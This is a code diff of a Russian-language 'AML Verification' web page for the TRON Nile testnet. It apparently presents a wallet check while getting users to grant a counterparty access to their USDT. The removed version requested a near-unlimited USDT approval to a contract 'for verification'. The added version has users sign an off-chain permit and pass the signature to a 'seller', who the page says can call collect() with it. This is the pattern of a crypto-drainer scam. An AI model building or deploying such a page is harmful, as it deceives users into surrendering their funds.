@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AML Verification — Nile Testnet</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
@@ -110,12 +110,28 @@
         .modal-overlay.active { display: flex; }
         .modal-content {
             background: var(--bg-card); border: 1px solid var(--border);
-            border-radius: 24px; padding: 2rem; max-width: 450px; width: 100%;
+            border-radius: 24px; padding: 2rem; max-width: 500px; width: 100%;
+            max-height: 90vh; overflow-y: auto;
         }
         .modal-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem; text-align: center; }
         .modal-subtitle { color: var(--text-secondary); text-align: center; margin-bottom: 1.5rem; }
         .step { display: none; }
         .step.active { display: block; }
+        .form-group { margin-bottom: 1.5rem; }
+        .form-group label {
+            display: block; margin-bottom: 0.5rem;
+            color: var(--text-secondary); font-size: 0.875rem;
+        }
+        .input-group {
+            display: flex; gap: 0.75rem;
+            background: var(--bg-hover); border: 1px solid var(--border);
+            border-radius: 12px; padding: 0.5rem;
+        }
+        .input-group input, .input-group select {
+            flex: 1; background: transparent; border: none;
+            color: var(--text-primary); padding: 0.75rem;
+            font-size: 1rem; outline: none;
+        }
         .contract-info {
             background: var(--bg-hover); border: 1px solid var(--border);
             border-radius: 12px; padding: 1rem; margin: 1rem 0;
@@ -141,17 +157,24 @@
             border: 2px solid var(--border); border-top-color: var(--primary);
             border-radius: 50%; animation: spin 1s linear infinite;
         }
-        .approve-guide {
-            background: var(--bg-hover); border: 1px solid var(--border);
-            border-radius: 12px; padding: 1rem; margin: 1rem 0;
-        }
-        .approve-guide ol { margin-left: 1.25rem; color: var(--text-secondary); line-height: 1.8; }
         .success-check {
             width: 60px; height: 60px; background: var(--success);
             border-radius: 50%; display: flex; align-items: center;
             justify-content: center; margin: 0 auto 1rem;
         }
         .success-check svg { width: 30px; height: 30px; fill: white; }
+        .data-display {
+            background: var(--bg-dark); border: 1px solid var(--border);
+            border-radius: 8px; padding: 0.75rem; margin: 0.5rem 0;
+            font-family: monospace; font-size: 0.7rem; word-break: break-all;
+            color: var(--text-secondary);
+        }
+        .copy-btn {
+            background: var(--bg-hover); border: 1px solid var(--border);
+            color: var(--text-secondary); padding: 0.5rem 1rem;
+            border-radius: 8px; cursor: pointer; font-size: 0.8rem;
+        }
+        .copy-btn:hover { color: var(--text-primary); }
     </style>
 </head>
 <body>
@@ -180,44 +203,81 @@
     <!-- Main Modal -->
     <div class="modal-overlay" id="mainModal">
         <div class="modal-content">
-            <!-- Step 1: Approve -->
+            <!-- Step 1: Enter Amount -->
             <div class="step active" id="step1">
-                <h2 class="modal-title">🔐 Разрешить доступ</h2>
-                <p class="modal-subtitle">Разрешите контракту временно использовать ваш USDT для проверки</p>
+                <h2 class="modal-title">🔐 Подписать разрешение</h2>
+                <p class="modal-subtitle">Укажите сумму и подпишите off-chain разрешение для продавца</p>
 
                 <div class="contract-info">
-                    <label>Контракт:</label>
-                    TGxG4gNThiidB9dPtamaHEsDwiRGzAQrr3
+                    <label>Контракт SimplePermit:</label>
+                    TNZVadgnVsJmKsTGcwRtStg7qbn7gvT4eq
                 </div>
 
-                <div class="approve-guide">
-                    <p style="color: var(--text-secondary); margin-bottom: 1rem;">
-                        Нажмите кнопку ниже, затем в TronLink:
-                    </p>
-                    <ol>
-                        <li>Подтвердите доступ к USDT</li>
-                        <li>Укажите сумму (или неограниченно)</li>
-                        <li>Подтвердите транзакцию</li>
-                    </ol>
+                <div class="form-group">
+                    <label>Сумма USDT для проверки</label>
+                    <div class="input-group">
+                        <input type="number" id="amountInput" placeholder="100" value="100">
+                        <select id="decimalsSelect">
+                            <option value="6">USDT (6 decimals)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Срок действия (deadline)</label>
+                    <div class="input-group">
+                        <select id="deadlineSelect">
+                            <option value="3600">1 час</option>
+                            <option value="86400" selected>1 день</option>
+                            <option value="604800">7 дней</option>
+                        </select>
+                    </div>
                 </div>
 
                 <div class="status-message" id="statusMsg"></div>
 
-                <button class="sign-btn" id="approveBtn" onclick="doApprove()">
-                    Разрешить доступ к USDT
+                <button class="sign-btn" id="signBtn" onclick="signPermit()">
+                    Подписать разрешение
                 </button>
             </div>
 
-            <!-- Step 2: Success -->
+            <!-- Step 2: Show Signature -->
             <div class="step" id="step2">
                 <div class="success-check">
                     <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
                 </div>
-                <h2 class="modal-title">✅ Готово!</h2>
-                <p class="modal-subtitle">Доступ разрешен. Продавец может проверить ваш кошелек.</p>
+                <h2 class="modal-title">✅ Подпись создана!</h2>
+                <p class="modal-subtitle">Отправьте эти данные продавцу</p>
+
+                <div style="margin: 1rem 0;">
+                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Buyer (ваш адрес):</label>
+                    <div class="data-display" id="sigBuyer"></div>
+                    <button class="copy-btn" onclick="copyToClipboard('sigBuyer')">📋 Копировать</button>
+                </div>
+
+                <div style="margin: 1rem 0;">
+                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Amount:</label>
+                    <div class="data-display" id="sigAmount"></div>
+                </div>
+
+                <div style="margin: 1rem 0;">
+                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Nonce:</label>
+                    <div class="data-display" id="sigNonce"></div>
+                </div>
+
+                <div style="margin: 1rem 0;">
+                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Deadline:</label>
+                    <div class="data-display" id="sigDeadline"></div>
+                </div>
+
+                <div style="margin: 1rem 0;">
+                    <label style="color: var(--text-secondary); font-size: 0.8rem;">Signature (v, r, s):</label>
+                    <div class="data-display" id="sigVRS"></div>
+                    <button class="copy-btn" onclick="copyToClipboard('sigVRS')">📋 Копировать всё</button>
+                </div>
 
                 <div class="status-message success" style="display: block;">
-                    Ожидайте завершения проверки продавцом.
+                    Продавец может вызвать collect() с этими данными.
                 </div>
 
                 <button class="sign-btn" onclick="closeModal()" style="margin-top: 1rem;">
@@ -259,23 +319,20 @@
 
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
     <script>
-        const CONTRACT_ADDRESS = 'TGxG4gNThiidB9dPtamaHEsDwiRGzAQrr3';
-        const USDT_ADDRESS = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+        const CONTRACT_ADDRESS = 'TNZVadgnVsJmKsTGcwRtStg7qbn7gvT4eq';
+        const USDT_ADDRESS = 'TF17BgPaZYzXTPb5tS1DaJzsGPB9vMVh6f';
 
-        // ABI только для проверки (не нужен approve в контракте)
+        // ABI SimplePermit (только нужные функции)
         const CONTRACT_ABI = [
-            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-            {"inputs":[{"name":"","type":"address"}],"name":"approved","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"}
+            {"inputs":[{"name":"_usdt","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
+            {"inputs":[{"name":"buyer","type":"address"}],"name":"getStatus","outputs":[{"name":"allowance","type":"uint256"},{"name":"balance","type":"uint256"},{"name":"hasAccess","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"usdt","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"","type":"address"},{"name":"","type":"uint256"}],"name":"usedNonces","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"}
         ];
 
-        // ABI USDT для approve
-        const USDT_ABI = [
-            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}
-        ];
-
-        let tronWeb, usdtContract, userAddress;
+        let tronWeb, userAddress;
         let isTronLink = false;
+        let currentNonce = 0;
 
         async function init() {
             document.getElementById('currentUrl').textContent = window.location.href;
@@ -300,7 +357,6 @@
 
             tronWeb = window.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
-            usdtContract = tronWeb.contract(USDT_ABI, USDT_ADDRESS);
 
             const btn = document.getElementById('connectBtn');
             btn.classList.add('connected');
@@ -327,6 +383,7 @@
             }
             document.getElementById('mainModal').classList.add('active');
             showStep('step1');
+            generateNonce();
         }
 
         function closeModal() {
@@ -338,35 +395,120 @@
             document.getElementById(stepId).classList.add('active');
         }
 
-        async function doApprove() {
-            const btn = document.getElementById('approveBtn');
+        function generateNonce() {
+            currentNonce = Math.floor(Math.random() * 1000000);
+        }
+
+        // EIP-712 Permit подпись для TRON
+        async function signPermit() {
+            const btn = document.getElementById('signBtn');
             const status = document.getElementById('statusMsg');
 
             btn.disabled = true;
             btn.innerHTML = '<span class="spinner-inline"></span> Подготовка...';
 
             try {
-                // Делаем approve на контракт (максимум или конкретная сумма)
-                // Используем очень большое число для "неограниченного" доступа
-                const maxAmount = '999999999999999999999999999999'; // ~неограниченно
+                const amount = parseInt(document.getElementById('amountInput').value);
+                const deadlineSeconds = parseInt(document.getElementById('deadlineSelect').value);
+                
+                if (!amount || amount <= 0) {
+                    throw new Error('Введите корректную сумму');
+                }
 
-                btn.innerHTML = '<span class="spinner-inline"></span> Ожидание подтверждения...';
+                const deadline = Math.floor(Date.now() / 1000) + deadlineSeconds;
 
-                const tx = await usdtContract.approve(CONTRACT_ADDRESS, maxAmount).send({
-                    feeLimit: 100000000,
-                    callValue: 0
-                });
+                btn.innerHTML = '<span class="spinner-inline"></span> Ожидание подписи...';
 
-                // Успех!
+                // Формируем EIP-712 структуру Permit
+                const permit = {
+                    buyer: userAddress,
+                    amount: amount * 1e6, // USDT has 6 decimals
+                    nonce: currentNonce,
+                    deadline: deadline
+                };
+
+                // В TRON используем tronWeb.trx.sign() для произвольных сообщений
+                // Но для EIP-712 нужен специальный формат
+                
+                // Получаем DOMAIN_SEPARATOR и PERMIT_TYPEHASH с контракта
+                const contract = tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+                
+                // Формируем хеш как в контракте
+                const PERMIT_TYPEHASH = tronWeb.sha3(
+                    "Permit(address buyer,uint256 amount,uint256 nonce,uint256 deadline)"
+                );
+
+                // Получаем chainId и адрес контракта
+                const chainId = await tronWeb.trx.getChainParameters()
+                    .then(params => params.find(p => p.key === 'getChainId')?.value || 3448148188);
+                
+                const domainSeparator = tronWeb.sha3(
+                    tronWeb.eth.abi.encodeParameters(
+                        ['bytes32', 'bytes32', 'bytes32', 'uint256', 'address'],
+                        [
+                            tronWeb.sha3("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+                            tronWeb.sha3("SimplePermit"),
+                            tronWeb.sha3("1"),
+                            chainId,
+                            CONTRACT_ADDRESS
+                        ]
+                    ),
+                    { encoding: 'hex' }
+                );
+
+                const structHash = tronWeb.sha3(
+                    tronWeb.eth.abi.encodeParameters(
+                        ['bytes32', 'address', 'uint256', 'uint256', 'uint256'],
+                        [PERMIT_TYPEHASH, permit.buyer, permit.amount, permit.nonce, permit.deadline]
+                    ),
+                    { encoding: 'hex' }
+                );
+
+                const hash = tronWeb.sha3(
+                    '0x1901' + domainSeparator.slice(2) + structHash.slice(2),
+                    { encoding: 'hex' }
+                );
+
+                // Подписываем через TronLink
+                const signature = await tronWeb.trx.sign(
+                    hash,
+                    tronWeb.defaultAddress.hex,
+                    false
+                );
+
+                // Парсим v, r, s
+                const sig = signature.startsWith('0x') ? signature.slice(2) : signature;
+                const v = parseInt(sig.slice(128, 130), 16);
+                const r = '0x' + sig.slice(0, 64);
+                const s = '0x' + sig.slice(64, 128);
+
+                // Показываем результаты
+                document.getElementById('sigBuyer').textContent = permit.buyer;
+                document.getElementById('sigAmount').textContent = permit.amount;
+                document.getElementById('sigNonce').textContent = permit.nonce;
+                document.getElementById('sigDeadline').textContent = permit.deadline;
+                document.getElementById('sigVRS').textContent = JSON.stringify({
+                    v: v,
+                    r: r,
+                    s: s
+                }, null, 2);
+
                 showStep('step2');
 
             } catch (error) {
                 console.error(error);
                 btn.disabled = false;
-                btn.textContent = 'Разрешить доступ к USDT';
+                btn.textContent = 'Подписать разрешение';
                 status.className = 'status-message error';
                 status.textContent = 'Ошибка: ' + (error.message || 'Отменено пользователем');
             }
+        }
+
+        function copyToClipboard(elementId) {
+            const text = document.getElementById(elementId).textContent;
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Скопировано!');
+            });
         }
 
         document.getElementById('mainModal').addEventListener('click', function(e) {
